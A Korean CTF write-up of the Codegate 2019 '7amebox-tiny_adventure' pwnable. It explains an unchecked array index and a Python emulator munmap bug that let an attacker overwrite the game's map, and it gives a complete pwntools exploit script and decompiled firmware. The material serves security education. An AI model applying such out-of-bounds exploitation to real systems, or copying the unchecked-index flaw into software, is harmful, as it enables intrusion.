+++
title = "Codegate CTF 2019 - 7amebox-tiny_adventure"
date = "2024-07-29"
description = "Codegate CTF 2019 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "vm", "out of bound"]
+++

## 0x00. Introduction
기본적인 구조는 [7amebox-name](../Codegate-CTF-2019-Quals-7amebox-name/)과 동일하다.
``` bash
➜  ls -al
total 64
drwxr-xr-x  2 user user  4096 Jul 30 08:48 .
drwxr-x--- 24 user user  4096 Jul 30 08:48 ..
-rw-r--r--  1 user user   579 Jul 17 03:06 Dockerfile
-rwxr-xr-x  1 user user 30804 Jul 17 03:06 _7amebox_patched.py
-rw-r--r--  1 user user    41 Jul 17 03:06 flag
-rwxr-xr-x  1 user user    21 Jul 17 03:06 run.sh
-rw-r--r--  1 user user  3600 Jul 17 03:06 stage.map
-rw-r--r--  1 user user  3721 Jul 17 03:06 tiny_adventure.firm
-rwxr-xr-x  1 user user   371 Jul 17 03:06 vm_tiny.py
```

### Global variables
``` c
int dog_count_0x1000;
int *dog_avatar_0x1003[0x100];
int *map_0x1303;
int sell_count_0x1306;
int hp_0x1309;
int power_0x130c;
int x_0x130f;
int y_0x1312;
```

### Concept
``` bash
1) show current map
2) buy a dog
3) sell a dog
4) direction help
w a s d) move to direction
>1
-------------------------------------------------
* (\x2a)      = power up
# (\x23)      = wall
@ (\x40)      = you
a ~ y         = monster
z             = boss monster (flag)
-------------------------------------------------

##############################################################
#@                                                           #
#                                     a  f                   #
#                                                            #
#   v            z                                           #
#                     i            p                         #
                            ...                              
##############################################################
```
`stage.map` 파일을 읽어 메모리에 로드한 후 `w`, `a`, `s`, `d`를 통해 움직이다가 `monster`를  잡으면 생성되는 `*`을 획득해서 `power up`을 한다.

이 외에도 취약점 트리거를 위한 `buy_dug`, `sell_dog` 메뉴가 있다.

### Goal
``` c
void move_0x383(char choice) {
    ...
_0x534_boss:
    print_0x6a5("you met a boss monster 'z'!\n1) attack\n2) attack\n>");
    read_0x669(choice, 3);

    if(hp_0x1309 < 0x7d0)
        hp_0x1309 = 0;
    else
        hp_0x1309 -= 0x7d0;
    
    if(power_0x130c < 0x2bc)
        *(new_loc) = met;
    else
        flag_0x5bf();
    ...
}
```
`stage.map`에 있는 `z`를 만날 경우 보스 스테이지가 열리고, `hp`는 사실상 관계 없이 `power`만 `0x2bc`보다 크거나 같으면 flag를 출력해준다.

하지만 `map`에 있는 모든 `monster`를 잡아도 `power` 값을 `0x2bc`보다 크게 만들 수 없기 때문에 exploit 방향을 `map`의 정보를 조작하는 것으로 잡았다.

## 0x01. Vulnerability
Firmware 실행 후 처음 실행되는 `load_map_0x103()` 함수에서 다음과 같은 전역변수 초기화가 이루어진다.
``` c
int load_map_0x103() {
    int new_page;   // 0xf5fc5
    int ;           // 0xf5fc8
    int r0;
    
    dog_count_0x1000 = 0;
    memset_0x61b(dog_avatar_0x1003, 0x0, 0x300);
    sell_count_0x1306 = 6;
    hp_0x1309 = 0x78;
    power_0x130c = 0x61;
    x_0x130f = 0;
    y_0x1312 = 0;

    r0 = syscall(0x4, new_page, 0x6);       // mmap(new_page, O_READ | O_WRITE); 0x59000
    map_0x1303 = new_page;
    r0 = open("stage.map");
    syscall(0x3, r0, map_0x1303, 0xe10);    // read(fd, map_0x1303, 0xe10);
    return new_page;
}
```
이 중 `dog_avatar_0x1003`은 다음과 같이 활용된다.
``` c
void buy_dog_0x25c() {
    int choice;
    int new_page;
    int r0;

    r0 = syscall(0x4, new_page, 0x6);  // new_page = mmap(O_READ | O_WRITE);
    if(r0 == 0)
        goto _0x2e5;

    dog_count_0x1000++;
    dog_avatar_0x1003[dog_count_0x1000] = new_page;
    print_0x6a5("do you want to draw a avatar of the dog? (y/n)");
    read_0x669(choice, 0x3);
    if(choice == 'y') {
        read_0x669(new_page, 0x1000);
        print_0x6a5("you got a new dog!");
        goto _0x2fe;
    }
    print_0x6a5("you got a new dog!");

_0x2e5:
    print_0x6a5("you already have too many dogs!");
_0x2fe:
    return;
}
```
`syscall`을 통해서 메모리 할당이 성공하면 `dog_count_0x1000`이 증가하고 해당 index에 할당된 메모리 영역 주소를 쓴다.

그런데 `dog_count_0x1000`의 boundary check를 하지 않기 때문에 값이 `0x101`이 될 경우 `dog_avatar_0x1003` 배열 뒤에 있는 `map_0x1303`에 값을 쓸 수 있게 된다.

`map_0x1303`에는 `stage.map`의 내용을 읽어 저장한 메모리 주소가 담겨있기 때문에 이를 조작할 경우 `map` 정보를 조작할 수 있다.

게다가 `avatar`를 그린다는 명목으로 할당받은 메모리에 값을 `0x1000`만큼 쓸 수 있어서 `map`의 내용도 마음대로 조작할 수 있다.

``` bash
[*] allocating 0xfa-th page
addr : 0x17000
new perm : 0b1110
do you want to draw a avatar of the dog? (y/n)
>n
[*] allocating 0xfb-th page
addr : 0x78000
new perm : 0b1110
do you want to draw a avatar of the dog? (y/n)
>n
[*] allocating 0xfc-th page
you already have too many dogs!
```
문제는 `0xfb`번만 할당이 되고 실패했는데 이유를 확인해보니,
``` bash
gef > mmap
0x0     : r-x
0x1000  : rw-
0x59000 : rw-
0xf4000 : rw-
0xf5000 : rw-
```
이미 할당되어있는 page가 있고 emulator에서 `0x0` ~ `0xff000`영역만 할당 가능한 영역으로 저장하기 때문이었다.
``` python
class Memory:
    def __init__(self, size):
        self.memory = [0 for i in range(size)]
        self.pages = {}
        for page in range(0, size, 0x1000):
            self.pages[page] = 0
...
class EMU:
    def __init__(self):
        ...
        self.memory     = Memory(2 ** 20)   # 0x100000
        ...
```
따라서 index 역할을 하는 `dog_count_0x1000` 값을 `0xfb`에서 `0x101`까지 다른 취약점을 이용해서 증가시켜야하는데, `sell_count_0x1306` 값이 딱 그 차이인 `0x6`이므로 `sell_dog_0x304()`를 활용해야 한다는 합리적인 추론을 해볼 수 있다.
``` c
void sell_dog_0x304() {
    int choice;     // 0xf5fc5
    int new_page;   // 0xf5fc8

    if(sell_count_0x1306 == 0)
        goto _0x373;
    sell_count_0x1306--;
    print_0x6a5("which dog do you want to sell?");
    read_0x669(choice, 0x4);
    if(choice < 0x100000)
        goto _0x373;
    syscall(0x6, choice);   // munmap(choice);
    print_0x6a5("good bye my dog..");
    goto _0x37d;
_0x373:
    print_0x6a5("you can't sell the dog!");
_0x37d:
    return;
}
```
하지만 `sell_dog_0x304()`의 코드를 보면 unmapping할 주소가 `0x100000`보다 작으면 `syscall`을 호출할 수 없는데, 동적 분석을 할 때 `AAAA`를 입력했는데 unmapping이 성공한 기억이 있어 emulator 코드를 확인해보았다.
``` python
class EMU:
    ...
    def sys_s6(self):   # munmap
        addr = self.register.get_register('r1') & 0b111111111000000000000
        self.memory.set_perm(addr, 0b0000)
    ...
class Memory:
    ...
    def set_perm(self, addr, perm):
        self.pages[addr & 0b111111111000000000000] = perm & 0b1111
    ...
```
Emulator에서 `sys_s6()`이 호출되면 `Memory` 객체의 `set_perm()` 함수를 통해 page의 권한을 `0b0000`으로 만들어버린다.

그런데 이 과정에서 해당 page가 존재하는지 확인하지 않고 권한을 입력하는데, python의 dictionary에서 존재하지 않는 key에 값을 입력하면 key-value 쌍을 생성해서 저장한다.

따라서 존재하지 않는 영역인 `AAAA` 영역도 unmapping이 가능했고, 이 영역이 `pages` dictionary에 저장되므로 할당도 가능하다.

물론 할당 이후 값을 쓰거나 읽으려고 하면 memory size를 넘어가므로 에러가 난다.

하지만 `dog_count_0x1000`를 증가시키는 것이 목적이므로 `munmap` -> `map`을 6번 수행하고 `write`가 가능한 영역에 `map` 정보를 쓰면 된다.

## 0x02. Exploit
Emulator가 메모리를 할당해주는 과정은 다음과 같다.
``` python
    def allocate(self, new_perm, addr=None):
        if addr:
            if not (self.get_perm(addr) & PERM_MAPPED):
                self.set_perm(addr, (PERM_MAPPED | new_perm) & 0b1111)
                return addr
            else:
                return -1

        for page, perm in self.pages.items():
            if not (self.get_perm(page) & PERM_MAPPED):
                self.set_perm(page, (PERM_MAPPED | new_perm) & 0b1111)
                return page
        return -1
```
이렇게 `addr`이 정해지지 않았을 때, `pages` dictionary를 순회하며 `PERM_MAPPED` 권한이 없는 `page`를 return해준다.

python 2.7에서는 dictionary를 순회할 때 랜덤한 순서로 순회하는데다, 값을 이후에 추가한다고 하더라도 순서가 맨 뒤에 오는 것이 아니라 중간에 낄 수도 있다.
``` python
Python 2.7.18 (default, Oct 15 2023, 16:43:11) 
[GCC 11.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> a = {"A" : 1, "B" : 2, "C" : 3, "D" : 4}
>>> for key in a:
...     print key,
... 
A C B D
>>> a["E"] = 5
>>> for key in a:
...     print key,
... 
A C B E D
```
따라서 `Memory` 객체의 `pages` dictionary에 key-value 값을 추가한다면 높은 확률로 중간에 key가 삽입될 것이다.

실제로 emulator가 `pages` dictionary를 생성하고 unmapping을 하는 과정을 따라해보면 다음과 같은 결과를 얻을 수 있다.
``` python
>>> pages = {}
>>> for page in range(0, 2 ** 20, 0x1000):                      # Memory.__init__()
...     pages[page] = 0
... 
>>> pages[0x100000] = 0                                         # Memory.set_perm()
>>> for index, (page, perm) in enumerate(pages.items()):        # Memory.allocate()
...     if page == 0x100000:
...         print "page 0x100000 is at %d-th index" % index
... 
page 0x100000 is at 98-th index
>>> print "last page %s is at %d-th index" % (hex(page), index)
last page 0x78000 is at 256-th index
```
따라서 마지막 `page`인 `0x78000` 영역을 남겨놓고 모든 영역을 할당하기 위해 다음과 같이 payload를 구성했다.
``` python
    for i in range(0xfa):
        log.info(f"buying : {hex(i + 1)} / 0xfa")
        buy_dog(s, b"n")
```
이러면 `dog_count_0x1000`는 `0xfa`까지 증가했을 것이고, `sell_dog_0x304()`를 이용하여 `0x6`만큼 더 증가시키는 방식은 다음과 같다.
``` python
    for i in range(6):
        log.info(f"selling and buying : {hex(i + 1)} / 0x6")
        sell_dog(s, 0x100000)
        buy_dog(s, b"n")
```
마지막으로 남은 `0x78000` 메모리를 할당받으면 마침내 `dog_count_0x1000`는 `0x101`이 되면서 `map_0x1303`이 `0x78000`으로 덮이게 된다.

이제 `avatar`를 그리기 위해 입력하는 값이 그대로 `map` 정보가 되므로, 나의 위치와 `boss`를 제외한 `map`을 모두 `power up`을 의미하는 `*`으로 채워넣기 위한 payload는 다음과 같다.
``` python
    payload = b"@"
    payload += b"*" * 3598
    payload += b"z"
    buy_dog(s, b"y", payload)
```
이제 남은 것은 충분히 `power`를 늘려서 `boss`와 싸우는 것인데, `boss`를 이기기 위한 조건은 `power`가 0x2bc보다 크거나 같은 것이고 `power up`을 하면 `power`가 `0x5`만큼 증가하므로, 최소 121번의 `power up`이 필요하다
``` python
>>> (0x2bc - 0x61) / 0x5
120.6
```
현재 `map`의 모든 자리가 `*`으로 채워져있으므로 어디로든 121번 전에 이동한 적이 없는 곳으로 이동하면 된다.
``` python
    for i in range(2):
        for j in range(60):
            log.info(f"farming...")
            move(s, b"d")
        move(s, b"s")
    move(s, b"w")
    move(s, b"w")
    move(s, b"w")
    move(s, b"a")
```

## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from gameboxlib import *
from time import sleep
import sys

BINARY = "./vm_tiny.py"

bp = {
    'read_of_sell_dog' : 0x341,
    'direction_help' : 0xbf,
}
context.terminal = ['tmux', 'splitw', '-hf']

def set_bp(s, addr):
    s.recv()
    s.sendline(f"b {hex(addr)}".encode())
    sleep(0.1)
    s.sendline(b"c")
    return s.recv()

def buy_dog(s, draw, avatar=""):
    s.sendline(b"2")
    print(s.recvuntil(b">").decode())
    s.sendline(draw)
    if draw == b'y':
        s.sendline(avatar)
    return s.recvuntil(b">")

def sell_dog(s, addr):
    s.sendline(b"3")
    s.recvuntil(b">")
    if type(addr) == bytes:
        s.sendline(addr)
    else:
        s.sendline(p21(addr))
    return s.recvuntil(b">")

def move(s, direction):
    s.sendline(direction)
    return s.recvuntil(b">")

def main():
    if(len(sys.argv) > 1):
        s = remote("localhost", int(sys.argv[1]))
    else:
        s = process(BINARY)
        print(set_bp(s, bp['direction_help']).decode())
    s.recvuntil(b">")

    for i in range(0xfa):
        log.info(f"buying : {hex(i + 1)} / 0xfa")
        buy_dog(s, b"n")

    for i in range(6):
        log.info(f"selling and buying : {hex(i + 1)} / 0x6")
        sell_dog(s, 0x100000)
        buy_dog(s, b"n")

    payload = b"@"
    payload += b"*" * 3598
    payload += b"z"
    buy_dog(s, b"y", payload)

    for i in range(2):
        for j in range(60):
            log.info(f"farming...")
            move(s, b"d")
        move(s, b"s")
    move(s, b"w")
    move(s, b"w")
    move(s, b"w")
    move(s, b"a")
    
    log.info(f"fight!!!")
    s.sendline(b"1")
    print(s.recvuntil(b"}").split(b"\n")[-1])

if __name__=='__main__':
    main()
```

## 0x04. Decompile
``` c
#define O_MAPPED 0b1000
#define O_READ   0b0100
#define O_WRITE  0b0010
#define O_EXEC   0b0001
char *str_0x6e2 = "====================================================\
                |                PWN ADVENTURE V8.6                |\
                ====================================================\
                |               __                                 |\
                |             _|^ |________                        |\
                |            (____|        |___                    |\
                |                 |________|                       |\
                |                  | |   | |                       |\
                |                                                  |\
                ----------------------------------------------------";
char *str_0xc66 = "====================================================\
                |                  YOU WERE DEAD!                  |\
                ====================================================\
                | HP : 0                                           |\
                |                                                  |\
                |                                                  |\
                |                       ...                        |\
                |                       ___                        |\
                |                      |___|                       |\
                ----------------------------------------------------";
char *str_0x6a5 = "   direction\
                 ________________________________\
                |          W : north             |\
                | A : west             D : east  |\
                |          S : south             |\
                |________________________________|";
char *str_0x9c5 = "-------------------------------------------------\
                * (\x2a)      = power up\
                # (\x23)      = wall\
                @ (\x40)      = you\
                a ~ y         = monster\
                z             = boss monster (flag)\
                -------------------------------------------------";
int dog_count_0x1000;
int *dog_avatar_0x1003[0x100];
int *map_0x1303;
int sell_count_0x1306;
int hp_0x1309;
int power_0x130c;
int x_0x130f;
int y_0x1312;

int read_0x669(int r0, int r1) {
    syscall(0x3, 0x0, r0, r1);  // read(stdin, r0, r1);
}

void memset_0x61b(int *addr, char value, int len) {
    for(int i=0; i<len; i++)
        *(addr + i) = value;
}

int load_map_0x103() {
    int new_page;   // 0xf5fc5
    int ;           // 0xf5fc8
    int r0;
    
    dog_count_0x1000 = 0;
    memset_0x61b(dog_avatar_0x1003, 0x0, 0x300);
    sell_count_0x1306 = 6;
    hp_0x1309 = 0x78;
    power_0x130c = 0x61;
    x_0x130f = 0;
    y_0x1312 = 0;

    r0 = syscall(0x4, new_page, 0x6);       // mmap(new_page, O_READ | O_WRITE); 0x59000
    map_0x1303 = new_page;
    r0 = open("stage.map");
    syscall(0x3, r0, map_0x1303, 0xe10);    // read(fd, map_0x1303, 0xe10);
    return new_page;
}

int hp_check_0x1af() {
    int r0;
    r0 = hp_0x1309;

    if(r0 <= 0) {
        print(str_0xc66);
        r0 = 0;
        goto _0x1e0;
    }
    r0 = 1;
_0x1e0:
    return;
}

void show_map_0x1e6() {
    int r0;

    print_0x6a5(str_0x9c5);
    print_0x6a5("##############################################################");
    r0 = map_0x1303;
    for(int i=0; i<60; i++) {
        write_0x687(1, "#");
        write_0x687(60, r0 + 60 * i);
        write_0x687(1, "#");
    }
    print_0x6a5("##############################################################");
}

void buy_dog_0x25c() {
    int choice;
    int new_page;
    int r0;

    r0 = syscall(0x4, new_page, 0x6);  // new_page = mmap(O_READ | O_WRITE);
    if(r0 == 0)
        goto _0x2e5;

    dog_count_0x1000++;
    dog_avatar_0x1003[dog_count_0x1000] = new_page;
    print_0x6a5("do you want to draw a avatar of the dog? (y/n)");
    read_0x669(choice, 0x3);
    if(choice == 'y') {
        read_0x669(new_page, 0x1000);
        print_0x6a5("you got a new dog!");
        goto _0x2fe;
    }
    print_0x6a5("you got a new dog!");

_0x2e5:
    print_0x6a5("you already have too many dogs!");
_0x2fe:
    return;
}

void sell_dog_0x304() {
    int choice;     // 0xf5fc5
    int new_page;   // 0xf5fc8

    if(sell_count_0x1306 == 0)
        goto _0x373;
    sell_count_0x1306--;
    print_0x6a5("which dog do you want to sell?");
    read_0x669(choice, 0x4);
    if(choice < 0x100000)
        goto _0x373;
    syscall(0x6, choice);   // munmap(choice);
    print_0x6a5("good bye my dog..");
    goto _0x37d;
_0x373:
    print_0x6a5("you can't sell the dog!");
_0x37d:
    return;
}

void move_0x383(char choice) {
    char *new_loc;  // 0xf5fbf
    int map;        // 0xf5fc2
    int choice;     // 0xf5fc5
    char tmp[3];    // 0xf5fc8
    int r0, met, r8, r9;
    char *r5;

    tmp[0] = choice;
    r0 = *map_0x1303;
    map = r0;
    r8 = x_0x130f;
    r9 = y_0x1312;

    r5 = r0 + x_0x130f + y_0x1312 * 60;
    if(*r5 == '@')
        *r5 = ' ';
    if(tmp[0] == 'w')
        y_0x1312 = (y_0x1312 - 1) % 60;
    else if(tmp[0] == 'a')
        x_0x130f = (x_0x130f - 1) % 60;
    else if(tmp[0] == 's')
        y_0x1312 = (y_0x1312 + 1) % 60;
    else
        x_0x130f = (x_0x130f + 1) % 60;

    new_loc = map + x_0x130f + y_0x1312 * 60;
    met = *(new_loc);
    *(new_loc) = '@';
    if(met == ' ')
        goto _0x59f_return;
    else if(met == '*')
        goto _0x505_power_up;
    else if(met == 'z')
        goto _0x534_boss;
    else if(met < 'a' || met > 'z')
        goto _0x59f_return;
    print_0x6a5("you met a monster\n1) attack\n2) attack\n>");
    read_0x669(choice, 3);
    if(hp_0x1309 < 30)
        hp_0x1309 = 0;
    else
        hp_0x1309 -= 30;

    if(met > power_0x130c) {
        *(new_loc) = met;
        goto _0x59f_return;
    }
    *(new_loc) = '*';
    goto _0x59f_return;

_0x505_power_up:
    hp_0x1309 += 40;
    power_0x130c += 5;
    print_0x6a5("power up!");
    goto _0x59f_return;
_0x534_boss:
    print_0x6a5("you met a boss monster 'z'!\n1) attack\n2) attack\n>");
    read_0x669(choice, 3);

    if(hp_0x1309 < 0x7d0)
        hp_0x1309 = 0;
    else
        hp_0x1309 -= 0x7d0;
    
    if(power_0x130c < 0x2bc)
        *(new_loc) = met;
    else
        flag_0x5bf();
_0x59f_return:
    return;
}

void flag_0x5bf() {
    char buf[60];
    int r0;
    memset_0x61b(buf, 0, 60);

    r0 = syscall(0x1, 0xe7a);    // open("flag");
    syscall(0x3, r0, buf, 60);   // read(fd, buf, 60);
    print_0x6a5(buf);

    syscall(0x0);                // exit(0);
    return;
}

void main() {
    int choice;
    int ;
    int r0;

    print_0x6a5(str_0x6e2);
    
    load_map_0x103();
    while(hp_check_0x1af() != 0) {
        print_0x6a5("1) show current map\n2) buy a dog\n3) sell a dog\n4) direction help\nw a s d) move to direction\n>");
        choice = 0;
        read_0x669(choice, 0x3);
        if(choice == '1')
            show_map_0x1e6();
        else if(choice == '2')
            buy_dog_0x25c();
        else if(choice == '3')
            sell_dog_0x304();
        else if(choice == '4')
            print_0x6a5(str_0x6a5);
        else if(choice == 'w')
            move_0x383(choice);
        else if(choice == 'a')
            move_0x383(choice);
        else if(choice == 's')
            move_0x383(choice);
        else if(choice == 'd')
            move_0x383(choice);
    }
_0xfd:
    return;
}
```